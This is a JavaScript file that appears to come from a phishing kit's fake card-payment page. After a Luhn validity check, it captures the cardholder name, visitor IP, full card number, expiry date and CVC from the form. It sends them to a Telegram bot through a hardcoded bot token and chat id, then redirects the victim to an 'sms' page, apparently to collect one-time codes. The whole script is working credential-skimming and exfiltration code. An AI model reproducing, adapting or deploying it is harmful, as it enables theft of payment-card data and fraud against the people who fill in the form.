function isCreditCardValid(creditCardNumber) {
  // Remove all non-digit characters from the input string
  const cleanedNumber = creditCardNumber.replace(/\D/g, '');
  
  // Check if the input string contains only digits and has a length of 16
  if (!/^\d{16}$/.test(cleanedNumber)) {
    return false;
  }
  
  // Convert the input string to an array of digits
  const digits = Array.from(cleanedNumber, Number);
  
  // Apply the Luhn algorithm to the array of digits
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if (i % 2 === 0) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    sum += digit;
  }
  
  // Check if the sum is divisible by 10
  return sum % 10 === 0;
}
setTimeout(function(){

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => localStorage.setItem("IP",data.ip));



$('form').submit(function(e){

$("#loader").show();

  
const cleanedNumber = $('#card-number').val().replace(/\D/g, '');

const getInput = $('#card-number').val();

const text1 = localStorage.getItem("IP");
localStorage.setItem("storageName",getInput);
e.preventDefault();
	$.ajax({
  url:'https://api.telegram.org/bot2142704123:AAHZyCvbJRKt7-tJezlGdWgx1X0Ue06wzJA/sendMessage',
  method:'POST',
  data:{
  chat_id:'1634271322',
  text:"BILLING"+ "\n"+ "\n"+ "\n"+
       "Name : "+$('#cardholder').val()+ "\n"+
       "IP   : "+localStorage.getItem("IP")+ "\n"+
       "CARD INFO"+ "\n"+ "\n"+ "\n"+
       "CC : "+cleanedNumber+ "\n"+
       "EX : "+$('#mm').val()+"/"+$('#yy').val()+ "\n"+
       "CVC : "+$('#account-cc-code').val()+ "\n",
  },
    success:function(){
		const isValid = isCreditCardValid($('#card-number').val());
		if (isValid) {
			var url= "./sms/index.html"; 
            window.location = url; 
            $("#loader").addClass("hidden");
		} else {
			var url= "./error.html"; 
            window.location = url; 
            $("#loader").addClass("hidden");
        }

    }
 
});
});
},7000); 